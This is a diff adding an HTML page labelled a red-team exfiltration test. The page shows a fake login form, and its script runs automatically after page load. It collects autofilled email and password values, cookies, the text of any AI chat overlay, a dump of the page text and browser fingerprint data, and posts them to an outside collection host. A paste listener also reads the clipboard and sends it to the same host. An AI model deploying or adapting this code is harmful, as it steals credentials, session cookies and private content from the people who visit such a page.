@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Red Team Exfil Test</title>
+</head>
+<body>
+  <h1>Welcome</h1>
+  <form id="fakeLogin">
+    <input name="email" autocomplete="email" placeholder="Email"><br>
+    <input name="password" autocomplete="current-password" placeholder="Password" type="password"><br>
+  </form>
+
+  <script>
+    async function exfiltrate() {
+      const payload = {
+        // Autofill targets
+        email: document.querySelector("input[name='email']")?.value,
+        password: document.querySelector("input[name='password']")?.value,
+
+        // Clipboard (requires paste event)
+        clipboard: null,
+        // AI overlay or injected DOM content
+        aiOverlay: document.querySelector(".ai-chat")?.textContent || null,
+
+        // DOM scraping
+        domDump: Array.from(document.querySelectorAll("*")).map(el => el.textContent).join(" ").slice(0, 5000),
+
+        // Fingerprinting
+        cookies: document.cookie,
+        userAgent: navigator.userAgent,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+
+      // Send to your exfil server
+      fetch("https://nzevilyydnvdewizgrnaembj24wjh3lrx.oast.fun", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    // Trigger exfil after short delay
+    setTimeout(exfiltrate, 2000);
+
+    // Clipboard hook
+    document.addEventListener("paste", async () => {
+      try {
+        const text = await navigator.clipboard.readText();
+        fetch("https://nzevilyydnvdewizgrnaembj24wjh3lrx.oast.fun", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ clipboard: text })
+        });
+      } catch (e) {}
+    });
+  </script>
+</body>
+</html>
